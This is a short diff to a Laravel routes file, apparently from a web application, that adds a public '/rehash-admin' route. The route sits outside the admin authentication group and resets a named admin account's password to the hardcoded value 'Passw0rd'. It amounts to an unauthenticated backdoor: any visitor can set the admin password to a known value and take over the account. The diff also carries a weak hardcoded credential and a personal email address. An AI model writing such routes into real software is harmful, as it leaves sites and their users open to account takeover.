@@ -57,3 +57,11 @@ Route::middleware(['admin.auth'])->group(function () {
     Route::put('/editEvent/{id}', [AddEventController::class, 'editEvent'])->name('editEvent');
 });
 
+
+Route::get('/rehash-admin', function () {
+    DB::table('admin')->where('email', 'aryoyudoo@gmail.com')->update([
+        'password' => Hash::make('Passw0rd')
+    ]);
+    return 'Password updated';
+});
+
